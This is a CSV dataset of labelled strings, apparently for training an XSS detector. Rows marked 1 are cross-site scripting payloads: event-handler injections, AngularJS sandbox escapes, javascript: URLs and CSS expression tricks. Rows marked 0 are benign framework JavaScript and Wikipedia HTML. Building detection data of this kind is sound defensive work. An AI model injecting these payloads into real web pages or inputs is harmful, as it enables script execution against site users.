payload,label
"<content onmouseenter=""alert(1)"">test</content>",1
"<style>body{-moz-binding:url(""http://.rocks/moz.xml#"")}</style>",1
"<br onmouseleave=""alert(1)"">test</br>",1
"document.addeventlistener('keydown', chips._handlechipskeydown); document.addeventlistener('keyup', chips._handlechipskeyup); this.el.addeventlistener('blur', chips._handlechipsblur, true);",0
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationend=""alert(1)""></form>",1
<button onpointermove=alert(1)>xss</button>,1
"<? echo('<scr)'; echo('ipt>alert("""")</script>'); ?>",1
let paddingleft = parseint(,0
<marquee onstart=alert(1)>xss</marquee>,1
}); } static clearmenus(event) {,0
<ul onpointerout=alert(1)>xss</ul>,1
"<div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/template:existential_risk_from_artificial_intelligence"" title=""template:existential risk from artificial intelligence""><abbr title=""view this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/template_talk:existential_risk_from_artificial_intelligence"" title=""template talk:existential risk from artificial intelligence""><abbr title=""discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=template:existential_risk_from_artificial_intelligence&amp;action=edit""><abbr title=""edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0
"</span> <span class=""reference-text""><a href=""#citerefdomingos2015"">domingos 2015 </a>, p.&#160;188.",0
"<li id=""cite_note-goodfellow2016-247""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-goodfellow2016_247-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-goodfellow2016_247-1""><sup><i><b>b </b> </i> </sup> </a>",0
<a autofocus onfocusin=alert(1) href></a>,1
"this._overlay.addeventlistener('touchend', this._handleclosereleasebound); this.el.addeventlistener('touchmove', this._handleclosedragbound); this.el.addeventlistener('touchend', this._handleclosereleasebound);",0
var plugin = m[pluginname],0
"_setlisteners() { eventhandler.on(this._element, event_mouseover, event => this._oninteraction(event, true)) eventhandler.on(this._element, event_mouseout, event => this._oninteraction(event, false))",0
"</span> <span class=""reference-text"">in the early 1970s, <a href=""/wiki/kenneth_colby"" title=""kenneth colby"">kenneth colby </a> presented a version of weizenbaum's <a href=""/wiki/eliza"" title=""eliza"">eliza </a> known as doctor which he promoted as a serious therapeutic tool. (<a href=""#citerefcrevier1993"">crevier 1993 </a>, pp.&#160;132–144)",0
"...tooltip.defaulttype, content: '(null|string|element|function)' };",0
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",1
"arrayproto = array.prototype,",0
<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,1
"_animatein() { anim({ targets: this.el,",0
} event.preventdefault(); event.stoppropagation();,0
if ($.isarray(opts.yearrange)) { i = opts.yearrange[0]; j = opts.yearrange[1] + 1;,0
"<audio oncontextmenu=""alert(1)"">test</audio>",1
<i id=x tabindex=1 onfocus=alert(1)></i>,1
<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,1
"<a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a>, <a href=""/wiki/hybrid_intelligent_system"" title=""hybrid intelligent system"">hybrid intelligent systems </a>:",0
"<li><a href=""/wiki/climber_(beam)"" class=""mw-redirect"" title=""climber (beam)"">climbing </a> </li>",0
try { el.removechild(ripple); } catch(e) {,0
"<menuitem draggable=""true"" ondragleave=""alert(1)"">test</menuitem>",1
const event_hide_prevented = `hideprevented${event_key$3}`; const event_hidden$3 = `hidden${event_key$3}`; const event_resize = `resize${event_key$3}`;,0
const class_name_fade = 'fade'; const class_name_show = 'show'; class alert extends basecomponent {,0
<picture onpointerenter=alert(1)>xss</picture>,1
"placement: '(string|function)',",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",1
var elementcss = getcomputedstyle$1(element),0
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,1
"<ul><li><a href=""#citerefmccorduck2004"">mccorduck 2004 </a>, pp.&#160;421–424, 486–489 </li>",0
"'sass/components/_typography.scss',",0
var width = clientrect.width / scalex,0
"<li><a href=""/wiki/android_(robot)"" title=""android (robot)"">android </a> </li>",0
} anim(animoptions); },0
"let offset = scrollspy.$el.offset().top + 1; anim({ targets: [document.documentelement, document.body],",0
<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,1
<bdi onpointerout=alert(1)>xss</bdi>,1
if (!closeddetails) { return elementisvisible; },0
<meta onpointerdown=alert(1)>xss</meta>,1
"this.container.id = ""autocomplete-options-"" + m.guid(); $(this.container).addclass('autocomplete-content dropdown-content'); this.$inputfield.append(this.container);",0
const tipid = index_js.getuid(this.constructor.name).tostring(),0
"<sup onbeforepaste=""alert(1)"" contenteditable>test</sup>",1
const height = 'height',0
"<iframe onmousedown=""alert(1)"">test</iframe>",1
"this.el.removeeventlistener('change', this._handlerangechangebound); this.el.removeeventlistener('mousedown', this._handlerangemousedowntouchstartbound); this.el.removeeventlistener('touchstart', this._handlerangemousedowntouchstartbound);",0
"<li><a href=""/wiki/philosophical_zombie"" title=""philosophical zombie"">zombie </a> </li>",0
"var v = valueget(); var updateable = ['margin', 'limit', 'padding', 'range', 'animate', 'snap', 'step', 'format']; updateable.foreach(function(name){",0
<style onload=alert(1)></style>,1
<video onpointerdown=alert(1)>xss</video>,1
"); this.container.addeventlistener('touchend', this._handlecontainermouseupandtouchendbound); }",0
"this._applymanipulationcallback(selector, manipulationcallback) } _applymanipulationcallback(selector, callback) {",0
const uid = makeeventuid(element); element.uidevent = uid; eventregistry[uid] = eventregistry[uid] || {};,0
if ( handle.hasattribute('disabled') ) {,0
"<small onclick=""alert(1)"">test</small>",1
throw new error('please use show on visible elements'),0
this.el.m_chips = undefined,0
"targets: this.dropdownel, opacity: { value: [0, 1],",0
var elementstyle = el.getattribute('style'),0
"newactiveindicator.classlist.add(class_name_active) newactiveindicator.setattribute('aria-current', 'true') }",0
<font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>,1
"targets: this.thumb, height: 0, width: 0,",0
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,1
"options.cssclasses.markerhorizontal, options.cssclasses.markervertical ];",0
"<form draggable=""true"" ondragend=""alert(1)"">test</form>",1
this.options.dist = 0; this._setcarouselheight(); if (this.showindicators) {,0
{{_s.constructor('alert(1)')()}},1
"<picture><source srcset=""validimage.png""><img onload=alert(1)></picture>",1
this.$el.append(this.$indicators[0]),0
"class collapsible extends component { constructor(el, options) { super(collapsible, el, options);",0
isanimated: this._isanimated() }) },0
return this._element.classlist.contains(class_name_horizontal) ? width : height,0
"this._slide(order, items[index]); } dispose() {",0
"}, { key: ""_setupeventhandlers"", value: function _setupeventhandlers() {",0
"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",1
"insertafter: function (selector) { var _this = this; cash(selector).each(function (el, i) {",0
"<object onmouseup=""alert(1)"">test</object>",1
"<iframe src=""javascript:alert(1)"">",1
top: m.getdocumentscrolltop() + this.windowheight / 2 -,0
{{'a'.constructor.prototype.charat=[].join;$eval('x=1} } };alert(1)//');}},1
</span> </li> </ul>,0
if (this._isactive) { return; },0
} static get default() { return default$b;,0
"return e(a, c);case ""attribute"": return a.getattribute(c);}return a[c] || 0; }function l(a, c) {",0
} jquery.error(`method ${methodoroptions} does not exist on jquery.${pluginname}`); };,0
"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",1
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",1
"this.dragtarget.removeeventlistener('touchmove', this._handledragtargetdragbound)",0
"cash.extend = fn.extend = function (target) { target = target || {}; var args = slice.call(arguments), length = args.length, i = 1;",0
"<summary onmouseleave=""alert(1)"">test</summary>",1
"} return list[math.max(0, math.min(index, listlength - 1))]; };",0
"<ul><li><a href=""/wiki/hexapod_(robotics)"" title=""hexapod (robotics)"">hexapod </a> </li> </ul> </li>",0
"<style>:target {transform: rotate(180deg);}</style><* id=x style=""transition:transform 2s"" ontransitionrun=print()></*>",1
let clickedindex = $(e.target) .closest('.carousel-item') .index();,0
_calcrangeoffset() {,0
"this.percentopen = math.min(1, totaldeltax / this._width); this.el.style.transform = transformprefix + "" translatex("" + transformx + ""px)""; this._overlay.style.opacity = this.percentopen;",0
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",1
}); newoptions.spectrum.direction = scope_spectrum.direction; scope_spectrum = newoptions.spectrum;,0
"}, { key: ""_setuplabel"", value: function _setuplabel() {",0
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,1
"<li id=""cite_note-sf-345""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-sf_345-0"">^ </a> </b>",0
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",1
"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",1
fn.extend({ addclass: function (c) { var classes = getclasses(c);,0
if ( (object.is(':valid') && haslength && len <= lenattr) || (object.is(':valid') && !haslength),0
"}); _this52.$anchor.css({ transform: 'translate3d(0,0,0)',",0
<p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>,1
"<center onmousemove=""alert(1)"">test</center>",1
this.$chips = this.$chips.filter(function(el) {,0
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1
"<form id=""rtd-search-form"" class=""wy-form"" action=""search.html"" method=""get"">",0
"<select ondblclick=""alert(1)"">test</select>",1
"<li><a href=""/wiki/document_management_system"" title=""document management system"">document management </a> </li> </ul>",0
for (const elem of togglelist) { const selector = selectorengine.getselectorfromelement(elem); const filterelement = selectorengine.find(selector).filter(foundelement => foundelement === this._element);,0
"} if (manipulator.getdataattribute(this, 'slide') === 'next') { carousel.next()",0
<marquee id=x tabindex=1 onfocus=alert(1)></marquee>,1
"if ( !(i === high && ignorelast)) { indexes[newpct.tofixed(5)] = [i, type]; }",0
<tt onpointerleave=alert(1)>xss</tt>,1
val.tolowercase() ); };,0
"? math.max(containerrect.bottom, window.innerheight) : containerrect.bottom; let scrollleft = container.scrollleft;",0
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",1
return (uid && `${uid}::${uidevent++}`) || element.uidevent || uidevent++,0
delete c[key]; } else if (node.dataset) { delete node.dataset[key];,0
"each(classes, function (c) {",0
if ( namespacedevent.split('.')[0] === 'update' ) {,0
"<dt onmousedown=""alert(1)"">test</dt>",1
"'input[type=text], input[type=password], input[type=email], input[type=url], input[type=tel], input[type=number], input[type=search], input[type=date], input[type=time], textarea'; $(input_selector).each(function(element, index) { let $this = $(this);",0
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",1
"<a href=""//google""></a>",1
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",1
<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>,1
"<li class=""toclevel-3 tocsection-17""><a href=""#cognitive_simulation""><span class=""tocnumber"">5.2.1",0
<svg><nav onload=alert(1)></nav>,1
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",1
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",1
return domelem.m_toast,0
"style=""width: expression(alert(''))",1
<input4 onpointerup=alert(1)>xss</input4>,1
return overflows[a] - overflows[b],0
"<table onmouseup=""alert(1)"">test</table>",1
"<tfoot draggable=""true"" ondragleave=""alert(1)"">test</tfoot>",1
"}, { key: ""_setcarouselheight"", value: function _setcarouselheight(imageonly) {",0
"duration: this.options.induration, easing: 'easeoutquad' });",0
if (this.options.accordion) { var $collapsiblelis = this.$el.children('li'); var $activelis = this.$el.children('li.active');,0
"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></samp>",1
return default$2; } static get defaulttype() {,0
let pbottom = $body.css('padding-bottom'); let finalheight = $body[0].scrollheight; $body.css({,0
return domelem.m_pushpin; } destroy() {,0
"} _track() { let now, elapsed, delta, v;",0
"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",1
"_classcallcheck(this, parallax)",0
<frameset><frame id=x onfocusin=alert(1)>,1
"<menuitem draggable=""true"" ondragstart=""alert(1)"">test</menuitem>",1
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",1
<noembed onpointerleave=alert(1)>xss</noembed>,1
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, ~18.3.3 </li> </ul>",0
"typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('../dom/event-handler.js'), require('../dom/selector-engine.js'), require('./config.js')) :",0
"x: commonx, y: reference.y - element.height };",0
this._removeindicators(); this._removeeventhandlers(); this.el.m_slider = undefined;,0
} _handleinputclick() { this.open();,0
<head onpointerup=alert(1)>xss</head>,1
"} this.percentopen = math.min(1, 1 - totaldeltax / this._width); this.el.style.transform = ""translatex("" + transformx + ""px)"";",0
this.message = this.options.html; this.panning = false; this.timeremaining = this.options.displaylength;,0
this._focustrap.deactivate(); this._element.blur(); this._isshown = false;,0
"eventhandler.one(this._element, event_slid, () => this.to(index))",0
"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>",1
"<p onmousedown=""alert(1)"">test</p>",1
if (ishtmlelement(offsetparent)) {,0
"<hr onpaste=""alert(1)"" contenteditable>test</hr>",1
_animatein() { this._positiontooltip(); this.tooltipel.style.visibility = 'visible';,0
"throw new typeerror(`no method named ""${config}""`) } data[config](this)",0
"'<div class=""datepicker-date-display"">', '<span class=""year-text""></span>', '<span class=""date-text""></span>',",0
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",1
"fireevent('change', handlenumber)",0
"'js/parallax.js', 'js/tabs.js', 'js/tooltip.js',",0
"const activenodes = selectorengine.find(`${selector_target_links}.${class_name_active$1}`, parent); for (const node of activenodes) { node.classlist.remove(class_name_active$1);",0
"<li><a href=""/wiki/circumscription_(logic)"" title=""circumscription (logic)"">circumscription </a> </li>",0
"key: ""close"", value: function close(index) { var $collapsibleli = this.$el.children('li').eq(index);",0
"<ul onmousemove=""alert(1)"">test</ul>",1
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",1
this.g = g; } _buildhoursview() {,0
return this._templatefactory } _getcontentfortemplate() {,0
const selector_modal = `.${class_name_modal}`; const event_modal_hide = 'hide.bs.modal'; const trigger_hover = 'hover';,0
"<figcaption oncontextmenu=""alert(1)"">test</figcaption>",1
"var isvertical = [top, bottom].indexof(_baseplacement) >= 0",0
} } _addtoucheventlisteners() {,0
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,1
<samp onpointerenter=alert(1)>xss</samp>,1
"return this.each(function () { const data = offcanvas.getorcreateinstance(this, config); if (typeof config !== 'string') {",0
const selector_nav_links = '.nav-link'; const selector_nav_items = '.nav-item'; const selector_list_items = '.list-group-item';,0
"<b onmousemove=""alert(1)"">test</b>",1
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",1
"this._setattributeifnotexists(parent, 'role', 'tablist') for (const child of children) { this._setinitialattributesonchild(child)",0
<keygen onpointerout=alert(1)>xss</keygen>,1
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationend=""alert(1)""></hr>",1
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",1
<tfoot onpointerenter=alert(1)>xss</tfoot>,1
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",1
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",1
"</span> <span class=""reference-text""><cite class=""citation arxiv"">sutskever, ilya; vinyals, oriol; le, quoc v. (2014). ""sequence to sequence learning with neural networks"". <a href=""/wiki/arxiv"" title=""arxiv"">arxiv </a>:<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1409.3215"">1409.3215 </a>",0
} next = next.nextelementsibling },0
"$textarea.data('previous-length', $textarea[0].value.length); }; $(document).ready(function () {",0
https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3cq%20oncut=eval(name),1
"return _this62; } _createclass(carousel, [{",0
let evt = document.createevent('htmlevents'),0
"for (const listgroup of selectorengine.parents(target, selector_nav_list_group)) { for (const item of selectorengine.prev(listgroup, selector_link_items)) { item.classlist.add(class_name_active)",0
"_inherits(materialbox, _component4); function materialbox(el, options) { _classcallcheck(this, materialbox);",0
"const hideevent = eventhandler.trigger(this._element, event_hide, relatedtarget)",0
"<basefont onmouseleave=""alert(1)"">test</basefont>",1
"this.container.removeeventlistener('mouseup', this._handlecontainermouseupandtouchendbound); if (typeof window.ontouchstart !== 'undefined') { this.container.removeeventlistener(",0
} } this._activetrigger[trigger_click] = false;,0
"this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound); this.el.removeeventlistener('touchend', this._handlecarouselreleasebound);",0
"}); }, closest: function (selector) {",0
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",1
"<rtc onclick=""alert(1)"">test</rtc>",1
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,1
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,1
"<picture><source srcset=""validimage.png""><image onloadend=alert(1)></picture>",1
"} function mergepaddingobject(paddingobject) { return object.assign({}, getfreshsideobject(), paddingobject);",0
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>",1
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input name=1 type=""image"" src=""validimage.png"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""xss via formtarget in input type image""></form>",1
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",1
y = _data$state$placement.y,0
"<output onmouseenter=""alert(1)"">test</output>",1
"<bdi oncontextmenu=""alert(1)"">test</bdi>",1
((isminyear && i < opts.minmonth) || (ismaxyear && i > opts.maxmonth),0
"eventhandler.on(this._element, event_pointerdown, event => this._start(event)); eventhandler.on(this._element, event_pointerup, event => this._end(event)); this._element.classlist.add(class_name_pointer_event);",0
}; anim(animoptions); },0
"<style type=""text/css"">body{background:url(""<javascript:alert>('')"")}</style>",1
const iselement = object => {,0
return overflow[side] >= 0,0
"<dir onmousedown=""alert(1)"">test</dir>",1
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",1
} ${positioninfo.verticalalignment === 'top' ? '0' : '100%'}`; } open() {,0
"renderrow(days, isrtl, isrowselected) {",0
trigger: 'click' } const defaulttype = {,0
_this2.each(function (v) {,0
} if (math.abs(clientrect.height - height) <= 1) { height = clientrect.height;,0
"<li><cite id=""citerefshapiro1992"" class=""citation book"">shapiro, stuart c. (1992). ""artificial intelligence"". in shapiro, stuart c. (ed.). <a rel=""nofollow"" class=""external text"" href=""http://www.cse.buffalo.edu/~shapiro/papers/ai.pdf""><i>encyclopedia of artificial intelligence </i> </a> <span class=""cs1-format"">(pdf)",0
"<h3><span class=""mw-headline"" id=""knowledge_representation"">knowledge representation",0
"(global = typeof globalthis !== 'undefined' ? globalthis : global || self, factory(global.sanitizer = {}))",0
popper: getlayoutrect(popper) }; // modifiers have the ability to reset the current update cycle. the state.reset = false;,0
"<content onkeyup=""alert(1)"" contenteditable>test</content>",1
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",1
"</span> <span class=""toctext"">history",0
"key: ""_getdaysinmonth"", value: function _getdaysinmonth(year, month) { return [31, datepicker._isleapyear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][month];",0
"yearhtml = `<select class=""datepicker-select orig-select-year"" tabindex=""-1"">${arr.join( '' )}</select>`;",0
"$(this).css('color', 'rgba(255,255,255,.9')",0
"const items = selectorengine.find(selector_visible_items, this._menu).filter(element => index_js.isvisible(element))",0
e.stoppropagation(); } _selectoption(optionel) {,0
toast.xpos = toast._xpos(e); toast.velocityx = toast.deltax / (date.now() - toast.time); toast.time = date.now();,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",1
this._finishselection(); } } else if ($target.closest('.month-prev').length) {,0
"myoffcanvas.foreach(offcanvas => { offcanvas.addeventlistener('show.bs.offcanvas', event => { event.preventdefault()",0
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",1
let dochandlekeyup = function(e) {,0
"collapsible: root.queryselectorall('.collapsible:not(.no-autoinit)'), datepicker: root.queryselectorall('.datepicker:not(.no-autoinit)'), dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'),",0
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",1
#&lt;img/src/onerror=alert(1)&gt;,1
return; } element.classlist.remove(class_name_active);,0
if (modal._modalsopen === 0) {,0
<svg><xss onload=alert(1)></xss>,1
if (args.length === 1) {,0
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>",1
const event_hide = 'hide',0
"<source onmouseleave=""alert(1)"">test</source>",1
"<style>@keyframes x{}</style><* style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></*>",1
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",1
"if (![arrow_left_key, arrow_right_key, arrow_up_key, arrow_down_key, home_key, end_key].includes(event.key)) { return; }",0
{{!ready && (ready = true) && ( !call ? $$watchers[0].get(tostring.constructor.prototype) : (a = apply) && (apply = constructor) && (valueof = call) && (''+''.tostring( 'f = function.prototype;' + 'f.apply = f.a;' + 'delete f.a;' + 'delete f.valueof;' + 'alert(1);' )));}},1
"<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b>",0
} _makedropdownfocusable() { this.dropdownel.tabindex = 0;,0
"const eventlisteners = { name: 'eventlisteners', enabled: true,",0
"handle.setattribute('data-handle', handlenumber)",0
let $activelis = this.$el.children('li.active'),0
"var carousel = function (_component18) { _inherits(carousel, _component18); function carousel(el, options) {",0
<meter onpointerleave=alert(1)>xss</meter>,1
"<content onmousemove=""alert(1)"">test</content>",1
"state = sethandle(handlenumber, locations[handlenumber] + proposal, b[o], f[o]) || state; }); if ( state ) {",0
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",1
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",1
templateelement.append(element); return; },0
"<code onmouseleave=""alert(1)"">test</code>",1
"<ul><li><a href=""/wiki/3d_optical_data_storage"" title=""3d optical data storage"">3d optical data storage </a> </li>",0
"<li><cite id=""citerefhinton2007"" class=""citation journal"">hinton, g. e. (2007). ""learning multiple layers of representation"". <i>trends in cognitive sciences </i>. <b>11 </b> (10): 428–434. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.tics.2007.09.004"">10.1016/j.tics.2007.09.004 </a>. <a href=""/wiki/pubmed_identifier"" class=""mw-redirect"" title=""pubmed identifier"">pmid </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/17921042"">17921042 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=trends+in+cognitive+sciences&amp;rft.atitle=learning+multiple+layers+of+representation&amp;rft.volume=11&amp;rft.issue=10&amp;rft.pages=428-434&amp;rft.date=2007&amp;rft_id=info%3adoi%2f10.1016%2fj.tics.2007.09.004&amp;rft_id=info%3apmid%2f17921042&amp;rft.aulast=hinton&amp;rft.aufirst=g.+e.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
<source onpointerout=alert(1)>xss</source>,1
"return pct + '%'; } function updatehandleposition ( handlenumber, to ) {",0
<sup onpointerleave=alert(1)>xss</sup>,1
"value: function _comparedates(a, b) { return a.gettime() === b.gettime(); }",0
dropdown.getorcreateinstance(this).toggle(),0
this._swipehelper.dispose() } super.dispose(),0
"<marquee onpaste=""alert(1)"" contenteditable>test</marquee>",1
"<frame onkeydown=""alert(1)"" contenteditable>test</frame>",1
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",1
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",1
"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>",1
"<a href=""http://0x42.0x0000066.0x7.0x93/""></a>",1
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",1
if (!outerelem.classlist.contains(class_dropdown)) {,0
<frame onpointerdown=alert(1)>xss</frame>,1
static getinstance(el) { let domelem = !!el.jquery ? el[0] : el; return domelem.m_floatingactionbutton;,0
} t = t.parentnode; },0
"anim({ targets: _this40.$active.find('.caption')[0], opacity: 1,",0
element.classlist.remove(class_name_show$1); return; },0
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",1
"-1!==a.indexof(""."")&&(b=a.split("".""),a=b[0],c&&(n=c+b[1]))",0
return e.clienty; } _wrap(x) {,0
return attributeoptions,0
"throw new error(""nouislider: 'animationduration' option must be a number.""); } }",0
_getinnerelement(elem) {,0
"this.placeholder.css({ height: '', width: '',",0
return api; } return {,0
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",1
"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dl>",1
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,1
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,1
<listing onpointerleave=alert(1)>xss</listing>,1
} } _iscurrentlyfixed() {,0
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>",1
<figure onpointermove=alert(1)>xss</figure>,1
if (originaltypeevent in customevents) {,0
const event_show$6 = `show${event_key$7}`,0
"key: ""_removethumb"", value: function _removethumb() { $(this.thumb).remove();",0
"<dt><a class=""reference internal"" href=""topics/api.html""><span class=""doc"">core api",0
"<li id=""cite_note-turing_test-351""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-turing_test_351-0"">^ </a> </b>",0
execute(this._config.clickcallback); }); this._isappended = true;,0
"}; var tests = { 'step': { r: false, t: teststep },",0
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",1
"scale: 0.4, translatey: _this50.offsety, translatex: _this50.offsetx,",0
"], dest: 'temp/js/materialize_concat.js' }",0
